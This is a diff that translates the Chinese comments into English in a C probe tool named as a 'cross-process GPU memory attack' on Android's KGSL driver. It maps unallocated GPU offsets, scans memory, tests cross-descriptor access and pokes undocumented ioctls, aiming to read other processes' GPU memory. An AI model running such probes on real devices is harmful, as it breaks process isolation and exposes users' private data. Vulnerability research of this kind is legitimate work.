@@ -1,17 +1,17 @@
 /*
- * kgsl_cross_process_attack.c - 跨進程 GPU 記憶體攻擊
+ * kgsl_cross_process_attack.c - cross-process GPU memory attack
  *
- * 確認:
- * - 同一進程內的多個 fd 共享 GPU 記憶體表
- * - offset=0x1000 對應第 0 頁
- * - offset=0x2000 對應第 1 頁
+ * Confirmed:
+ * - multiple fds in the same process share the GPU memory table
+ * - offset=0x1000 corresponds to page 0
+ * - offset=0x2000 corresponds to page 1
  *
- * 接下來測試:
- * 1. 是否可以讀取未分配的 GPU 頁面
- * 2. 是否可以跨進程訪問 GPU 記憶體
- * 3. 是否可以訪問系統服務的 GPU 記憶體
+ * Next, test:
+ * 1. Whether unallocated GPU pages can be read
+ * 2. Whether GPU memory can be accessed across processes
+ * 3. Whether system services' GPU memory can be accessed
  *
- * 編譯:
+ * Build:
  * aarch64-linux-android31-clang -static -O2 -o kgsl_cross_process_attack kgsl_cross_process_attack.c
  */
 
@@ -53,8 +53,8 @@ int safe_read(void *ptr, uint64_t *out)
 }
 
 /*
- * 掃描大範圍的 offset，看看是否有可訪問的區域
- * 這可能發現其他進程分配的 GPU 記憶體
+ * Scan a wide offset range to see whether any region is accessible
+ * This may find GPU memory allocated by other processes
  */
 void scan_gpu_memory_range()
 {
@@ -73,10 +73,10 @@ void scan_gpu_memory_range()
     int accessible = 0;
     int non_zero = 0;
 
-    // 掃描大範圍
-    // 0x1000 = 第 0 頁
-    // 0x100000 = 第 255 頁
-    // 0x1000000 = 第 4095 頁
+    // Scan a wide range
+    // 0x1000 = page 0
+    // 0x100000 = page 255
+    // 0x1000000 = page 4095
 
     printf("[*] Scanning offset 0x1000 to 0x100000 (256 pages)...\n");
 
@@ -94,7 +94,7 @@ void scan_gpu_memory_range()
             {
                 non_zero++;
 
-                // 只顯示前幾個有趣的
+                // Only show the first few interesting ones
                 if (non_zero <= 10)
                 {
                     printf("    [+] offset=0x%lx: 0x%lx\n", offset, val);
@@ -112,14 +112,14 @@ void scan_gpu_memory_range()
 }
 
 /*
- * 不分配任何記憶體，嘗試訪問 offset=0x1000
- * 如果成功，可能是訪問到其他進程的 GPU 記憶體
+ * Allocate nothing and try to access offset=0x1000
+ * If it succeeds, it may be accessing another process's GPU memory
  */
 void test_unallocated_access()
 {
     printf("\n=== Testing Unallocated GPU Memory Access ===\n");
 
-    // 打開新的 fd，不做任何分配
+    // Open a new fd without any allocation
     int fd = open("/dev/kgsl-3d0", O_RDWR);
     if (fd < 0)
     {
@@ -130,7 +130,7 @@ void test_unallocated_access()
     signal(SIGSEGV, sig_handler);
     signal(SIGBUS, sig_handler);
 
-    // 嘗試訪問 offset=0x1000 (不分配)
+    // Try to access offset=0x1000 (no allocation)
     void *ptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                      MAP_SHARED, fd, 0x1000);
 
@@ -164,7 +164,7 @@ void test_unallocated_access()
 }
 
 /*
- * 測試大量 offset 範圍，看看能訪問到什麼
+ * Test a large range of offsets to see what can be accessed
  */
 void probe_all_accessible_memory()
 {
@@ -177,7 +177,7 @@ void probe_all_accessible_memory()
     signal(SIGSEGV, sig_handler);
     signal(SIGBUS, sig_handler);
 
-    // 先分配一個，確認我們的範圍
+    // First allocate one to confirm our range
     struct
     {
         uint64_t gpuaddr;
@@ -191,7 +191,7 @@ void probe_all_accessible_memory()
     uint64_t our_gpuaddr = req.gpuaddr;
     printf("[*] Our allocation: 0x%lx\n", our_gpuaddr);
 
-    // 嘗試訪問我們分配之前的頁面
+    // Try to access pages before our allocation
     printf("\n[*] Trying to access pages before our allocation:\n");
 
     for (uint64_t offset = 0x1000; offset <= 0x10000; offset += 0x1000)
@@ -226,13 +226,13 @@ void probe_all_accessible_memory()
 }
 
 /*
- * 測試是否可以通過創建多個 fd 來擴展訪問範圍
+ * Test whether creating multiple fds extends the accessible range
  */
 void test_multi_fd_extend()
 {
     printf("\n=== Testing Multi-FD Access Extension ===\n");
 
-    // fd1 分配第一個區塊
+    // fd1 allocates the first block
     int fd1 = open("/dev/kgsl-3d0", O_RDWR);
     if (fd1 < 0)
         return;
@@ -250,7 +250,7 @@ void test_multi_fd_extend()
     uint64_t fd1_addr = req.gpuaddr;
     printf("[*] fd1 allocated: 0x%lx\n", fd1_addr);
 
-    // 在 fd1 的分配上寫入
+    // Write into fd1's allocation
     void *ptr1 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                       MAP_SHARED, fd1, fd1_addr);
     if (ptr1 != MAP_FAILED)
@@ -258,7 +258,7 @@ void test_multi_fd_extend()
         *(volatile uint64_t *)ptr1 = 0x1111111111111111ULL;
     }
 
-    // fd2 分配新的區塊
+    // fd2 allocates a new block
     int fd2 = open("/dev/kgsl-3d0", O_RDWR);
     if (fd2 < 0)
     {
@@ -272,7 +272,7 @@ void test_multi_fd_extend()
     uint64_t fd2_addr = req.gpuaddr;
     printf("[*] fd2 allocated: 0x%lx\n", fd2_addr);
 
-    // 在 fd2 的分配上寫入
+    // Write into fd2's allocation
     void *ptr2 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                       MAP_SHARED, fd2, fd2_addr);
     if (ptr2 != MAP_FAILED)
@@ -283,10 +283,10 @@ void test_multi_fd_extend()
     signal(SIGSEGV, sig_handler);
     signal(SIGBUS, sig_handler);
 
-    // 測試: fd1 能否訪問 fd2 的區塊?
+    // Test: can fd1 access fd2's block?
     printf("\n[*] Testing fd1 access to fd2's memory:\n");
 
-    // 計算 fd2 區塊的 offset
+    // Compute the offset of fd2's block
     uint64_t fd2_page = (fd2_addr - 0x4000000000ULL) / 0x1000;
     uint64_t fd2_offset = (fd2_page + 1) * 0x1000;
 
@@ -309,7 +309,7 @@ void test_multi_fd_extend()
         munmap(cross_ptr, 0x1000);
     }
 
-    // 清理
+    // Clean up
     if (ptr1 != MAP_FAILED)
         munmap(ptr1, 0x1000);
     if (ptr2 != MAP_FAILED)
@@ -319,7 +319,7 @@ void test_multi_fd_extend()
 }
 
 /*
- * 嘗試使用 GPU_AUX_COMMAND 在共享記憶體上執行操作
+ * Try to use GPU_AUX_COMMAND to operate on the shared memory
  */
 void test_gpu_command_on_shared()
 {
@@ -329,7 +329,7 @@ void test_gpu_command_on_shared()
     if (fd < 0)
         return;
 
-    // 分配 GPU 記憶體
+    // Allocate GPU memory
     struct
     {
         uint64_t gpuaddr;
@@ -349,7 +349,7 @@ void test_gpu_command_on_shared()
 
     printf("[+] Allocated: gpuaddr=0x%lx\n", alloc_req.gpuaddr);
 
-    // 準備 GPU 命令
+    // Prepare the GPU command
     // ioctl 0x58 = GPU_AUX_COMMAND
     struct
     {
@@ -366,7 +366,7 @@ void test_gpu_command_on_shared()
 }
 
 /*
- * 嘗試利用 SYNCSOURCE_CREATE_FENCE (0x56)
+ * Try to exploit SYNCSOURCE_CREATE_FENCE (0x56)
  */
 void test_syncsource_fence()
 {
@@ -376,7 +376,7 @@ void test_syncsource_fence()
     if (fd < 0)
         return;
 
-    // 結構可能是:
+    // The structure may be:
     // { uint32_t id; int fence_fd; }
 
     struct
@@ -404,22 +404,22 @@ int main()
     printf("=== KGSL Cross-Process Attack ===\n");
     printf("=================================\n");
 
-    // 測試未分配記憶體訪問
+    // Test access to unallocated memory
     test_unallocated_access();
 
-    // 探測所有可訪問的記憶體
+    // Probe all accessible memory
     probe_all_accessible_memory();
 
-    // 測試多 fd 擴展
+    // Test multi-fd extension
     test_multi_fd_extend();
 
-    // 掃描 GPU 記憶體範圍
+    // Scan the GPU memory range
     scan_gpu_memory_range();
 
-    // 測試 syncsource fence
+    // Test syncsource fence
     test_syncsource_fence();
 
-    // 測試 GPU 命令
+    // Test the GPU command
     test_gpu_command_on_shared();
 
     return 0;
